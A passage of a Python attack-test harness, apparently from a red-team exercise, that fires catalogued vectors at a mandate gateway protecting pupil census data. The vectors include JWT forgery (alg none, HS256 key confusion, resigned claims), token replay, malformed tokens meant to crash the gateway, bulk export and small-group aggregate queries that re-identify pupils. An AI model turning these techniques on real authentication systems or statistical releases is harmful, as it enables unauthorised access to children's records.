        "note": "SCH07 has one in-care pupil (five census rows). The count must come back null, not rounded up to 10.",
    },
    {
        "id": "agg-group-of-one-rows",
        "group": "aggregate",
        "kind": "info",
        "needs_mint": True,
        "title": "in-care pupil at SCH07 described by fine groups",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "aggregate",
        "arguments": {
            "table": CENSUS,
            "group_by": [
                "URN",
                "InCareAtCurrentSchool",
                "Gender",
                "AgeAtStartOfAcademicYear",
                "AcademicYear",
                "CensusTerm",
            ],
            "measure": "InCareAtCurrentSchool",
            "where": {"URN": NAMED["urn"], "InCareAtCurrentSchool": "1"},
        },
        "note": "Each group is one census row of the one pupil in care. RAN (no rows) is held; DATA means a group "
        "of one was released, even with its total rounded to 0.",
    },
    {
        "id": "agg-brookmere-meals",
        "group": "aggregate",
        "kind": "info",
        "needs_mint": True,
        "title": "Brookmere free-meal count",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "aggregate",
        "arguments": {"table": CENSUS, "group_by": ["URN"], "measure": "FSMeligible", "where": {"URN": "SCH02"}},
        "note": "74 meal rows. Pair with the WHIT count: both should round to 70 so the difference leaks nothing.",
    },
    {
        "id": "agg-brookmere-meals-whit",
        "group": "aggregate",
        "kind": "info",
        "needs_mint": True,
        "title": "Brookmere free-meal count, WHIT",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "aggregate",
        "arguments": {
            "table": CENSUS,
            "group_by": ["URN"],
            "measure": "FSMeligible",
            "where": {"URN": "SCH02", "Ethnicity": "WHIT"},
        },
        "note": "69 of the 74. If rounding leaves 74 and 69, the difference (5) identifies the non-WHIT pupils.",
    },
    # --- forged mandates ---
    {
        "id": "forged-edit-clearance",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "title": "raise the clearance, keep the signature",
        "mandate": {"base": "default", "forge": {"op": "keep-sig", "set": {"clearance": 5}}},
        "tool": "search",
        "arguments": {"query": FLAG["pupil"], "urn": "SCH01"},
        "note": "Editing any claim breaks the issuer signature; SIG_INVALID must hold it.",
    },
    {
        "id": "forged-widen-scope",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "title": "widen the scope to SCH04 pupil",
        "mandate": {
            "base": "default",
            "forge": {
                "op": "keep-sig",
                "set": {
                    "scope": [{"server": SERVER, "tools": ["pupil", "search"], "constraints": {"urn": [FLAG["urn"]]}}]
                },
            },
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "A widened scope with the old signature must be SIG_INVALID.",
    },
    {
        "id": "forged-untrusted-issuer",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "title": "re-sign under an untrusted issuer",
        "mandate": {
            "base": "default",
            "forge": {
                "op": "random-issuer",
                "set": {
                    "iss": "https://untrusted.invalid",
                    "scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [FLAG["urn"]]}}],
                },
            },
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "An issuer not on the trusted list must be ISSUER_NOT_ACCREDITED.",
    },
    {
        "id": "forged-alg-none",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "title": "unsigned token (alg none)",
        "mandate": {
            "base": "default",
            "forge": {
                "op": "none",
                "set": {"scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [FLAG["urn"]]}}]},
            },
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "alg none is not EdDSA; the gateway must refuse it (SIG_INVALID).",
    },
    {
        "id": "forged-hs256",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "needs_mint": True,
        "title": "alg confusion (HS256 with the public key)",
        "mandate": {
            "base": "default",
            "forge": {
                "op": "hs256",
                "set": {"scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [FLAG["urn"]]}}]},
            },
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "Signing HS256 with the issuer public key must fail because the gateway pins EdDSA.",
    },
    {
        "id": "forged-typ",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "title": "wrong token type in the header",
        "mandate": {"base": "default", "forge": {"op": "keep-sig", "header": {"typ": "JWT"}}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "typ must be mandate+jwt; anything else is WRONG_TOKEN_TYPE.",
    },
    {
        "id": "forged-swap-cnf",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "title": "rebind the mandate to our own key",
        "mandate": {"base": "default", "forge": {"op": "swap-cnf"}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "Swapping cnf to a key we hold breaks the signature; SIG_INVALID must hold it.",
    },
    {
        "id": "forged-demo-mint",
        "group": "forged",
        "kind": "attack",
        "type": "demo",
        "break": "forged",
        "title": "mint a mandate through the demo route",
        "demo_mandate": {"urn": FLAG["urn"], "tools": ["pupil", "search"], "clearance": 4},
        "demo_call": {"tool": "pupil", "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]}},
        "note": "The demo router mints mandates on request. If it is mounted, anyone can mint SCH04 access.",
    },
    # --- dead mandates ---
    {
        "id": "dead-expired",
        "group": "dead",
        "kind": "attack",
        "break": "dead",
        "needs_mint": True,
        "title": "an expired mandate",
        "mandate": {"mint": {**_DEFAULT_MINT, "ttl": -120}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "exp more than 30 s ago must be EXPIRED.",
    },
    {
        "id": "dead-revoked",
        "group": "dead",
        "kind": "attack",
        "break": "dead",
        "needs_mint": True,
        "title": "a revoked mandate",
        "mandate": {"mint": dict(_DEFAULT_MINT), "revoke": True},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "A set status bit must be REVOKED on the next call.",
    },
    {
        "id": "dead-nbf",
        "group": "dead",
        "kind": "attack",
        "break": "dead",
        "needs_mint": True,
        "title": "a not-yet-valid mandate",
        "mandate": {"base": "default", "forge": {"op": "issuer", "set": {"nbf": int(time.time()) + 4000}}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "nbf in the future (past the 30 s skew) must be NOT_YET_VALID.",
    },
    # --- no key / proof of possession ---
    {
        "id": "nokey-blank",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "blank signature",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"sig": "blank"},
        "note": "An unsigned request must be POP_FAILED.",
    },
    {
        "id": "nokey-garbage",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "garbage signature",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"sig": "garbage"},
        "note": "A random signature must be POP_FAILED.",
    },
    {
        "id": "nokey-wrong-key",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "signed by another key",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"sig": "wrong-key"},
        "note": "A signature from a key other than cnf must be POP_FAILED.",
    },
    {
        "id": "nokey-stale",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "stale timestamp",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"ts_offset": -SKEW},
        "note": "A timestamp outside the 300 s window must be POP_FAILED.",
    },
    {
        "id": "nokey-future",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "future timestamp",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"ts_offset": SKEW},
        "note": "A timestamp 10 minutes ahead must be POP_FAILED.",
    },
    {
        "id": "nokey-mutate",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "arguments changed after signing",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"mutate_after": {"limit": 1}},
        "note": "Changing arguments after signing must be POP_FAILED.",
    },
    {
        "id": "nokey-replay",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "replay the same request",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"replay": True},
        "note": "A repeated nonce must be POP_FAILED on the replay.",
    },
    # --- bulk ---
    {
        "id": "bulk-limit-101",
        "group": "bulk",
        "kind": "attack",
        "title": "ask for 101 rows",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "2021/22", "urn": "SCH01", "limit": 101},
        "note": "limit over 100 must be TOO_MUCH.",
    },
    {
        "id": "bulk-limit-100",
        "group": "bulk",
        "kind": "info",
        "title": "ask for 100 rows",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "2021/22", "urn": "SCH01", "limit": 100},
        "note": "The cap is per call; 100 rows is allowed, so many calls still add up.",
    },
    {
        "id": "bulk-get-census",
        "group": "bulk",
        "kind": "attack",
        "break": "bulk",
        "needs_mint": True,
        "title": "bulk-export the census in one get",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["get"], "constraints": {"path": [CENSUS_CSV]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "get",
        "arguments": {"path": CENSUS_CSV, "limit": 5000},
        "note": "A get mandate on the census with no row cap leaks every pupil at once (bulk).",
    },
    # --- crash ---
    {
        "id": "crash-empty",
        "group": "crash",
        "kind": "attack",
        "break": "crash",
        "title": "empty mandate string",
        "mandate": {"raw": ""},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "A malformed mandate must be a 403 denial, not a 500.",
    },
    {
        "id": "crash-not-jwt",
        "group": "crash",
        "kind": "attack",
        "break": "crash",
        "title": "non-JWT mandate",
        "mandate": {"raw": "not-a-jwt"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "A non-JWT mandate must be a 403 denial, not a 500.",
    },
    {
        "id": "crash-abc",
        "group": "crash",
        "kind": "attack",
        "break": "crash",
        "title": "three empty JWT segments",
        "mandate": {"raw": "a.b.c"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "A junk three-part token must be a 403 denial, not a 500.",
    },
    {
        "id": "crash-no-iss",
        "group": "crash",
        "kind": "attack",
        "break": "crash",
        "needs_mint": True,
        "title": "valid signature, no issuer claim",
        "mandate": {"base": "default", "forge": {"op": "issuer", "del": ["iss"]}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "The verifier reads iss before catching errors; a missing iss must not 500.",
    },
    {
        "id": "crash-no-status",
        "group": "crash",
        "kind": "attack",
        "break": "crash",
        "needs_mint": True,
        "title": "valid signature, no status claim",
        "mandate": {"base": "default", "forge": {"op": "issuer", "del": ["status"]}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "A missing status claim must be a denial, not a 500.",
    },
    {
        "id": "crash-no-cnf",
        "group": "crash",
        "kind": "attack",
        "break": "crash",
        "needs_mint": True,
        "title": "valid signature, no cnf claim",
        "mandate": {"base": "default", "forge": {"op": "issuer", "del": ["cnf"]}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "A missing cnf (proof-of-possession key) must be a denial, not a 500.",
    },
    # --- keys / discovery ---
    {
        "id": "keys-describe",
        "group": "keys",
        "kind": "attack",
        "type": "discovery",
        "break": "keys",
        "path": "/describe",
        "title": "scan /describe for the issuer key",
        "note": "Discovery must never carry the issuer private key.",
    },
    {
        "id": "keys-demo-issuer",
        "group": "keys",
        "kind": "attack",
        "type": "discovery",
        "break": "keys",
        "path": "/demo/issuer",
        "title": "scan /demo/issuer for the issuer key",
        "note": "The issuer page must show only the public half.",
    },
    {
        "id": "keys-demo-trust",
        "group": "keys",
        "kind": "attack",
        "type": "discovery",
        "break": "keys",
        "path": "/demo/trust",
        "title": "scan /demo/trust for the issuer key",
        "note": "The trust view must not expose any private key.",
    },
]


def saved() -> list[dict]:
    if not SAVED.is_file():
        return []
    try:
        return json.loads(SAVED.read_text())
    except json.JSONDecodeError:
        return []


def catalog() -> list[dict]:
    return _CATALOG + [{**v, "group": "saved"} for v in saved()]


_SAVE_KEYS = (
    "id",
    "group",
    "title",
    "kind",
    "type",
    "needs_mint",
    "note",
    "mandate",
    "tool",
    "arguments",
    "tweaks",
    "break",
    "demo_mandate",
    "demo_call",
    "path",
)


def save_vector(spec: dict) -> dict:
    clean = {key: spec[key] for key in _SAVE_KEYS if key in spec}
    clean.setdefault("group", "saved")
    clean.setdefault("id", f"saved-{int(time.time())}")
    data = saved()
    data.append(clean)
    SAVED.write_text(json.dumps(data, indent=2))
    return {"saved": len(data), "file": str(SAVED.relative_to(ROOT)), "vector": clean}


# ---------------------------------------------------------------- headless cli


def _out(line: str = "") -> None:
    sys.stdout.write(f"{line}\n")


def _report(findings: list[dict]) -> int:
    width = max((len(f["id"]) for f in findings), default=10)
    problems = 0
    for f in findings:
        if f["error"]:
            _out(f"ERR   {f['id']:<{width}}  {f['error']}")
            continue
        extra = []
        if f["points"]:
            extra.append(f"{f['points']} pts")
        if f["flags"]:
            extra.append(f["flags"][0]["id"])
        if f["breaks"]:
            extra.append("+".join(f["breaks"]))
        tail = f"  ({', '.join(extra)})" if extra else ""
        _out(f"{f['outcome']:<10}{f['id']:<{width}}  HTTP {f['status']} {f['got'] or f['reason'] or ''}{tail}")
        if f["outcome"] in ("LANDED", "BROKE", "OVER-DENY"):
            problems += 1
    _out("")
    _out(f"{len(findings)} vectors, {problems} needing attention")
    return problems


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default="own", help="own, or a folder name under day_2_attack/targets/")
    parser.add_argument(
        "--url", default=os.environ.get("GATEWAY_URL", "http://localhost:8082"), help="gateway URL (own target)"
    )
    parser.add_argument(
        "--group",
        default=None,
        help="run one group only (data, forged, dead, nokey, bulk, crash, keys, aggregate, baseline)",
    )
    parser.add_argument("--list", action="store_true", help="list the vectors and exit")
    args = parser.parse_args(argv)
    if args.list:
        for v in catalog():
            mint = " [own]" if v.get("needs_mint") else ""
            _out(f"{v['group']:<10}{v['id']:<22}{v['title']}{mint}")
        return
    target = load_target(args.target, args.url)
    http = bind_http(target.url or args.url)
    findings = run_group(target, args.group, http) if args.group else run_all(target, http)
    sys.exit(1 if _report(findings) else 0)


if __name__ == "__main__":
    main()
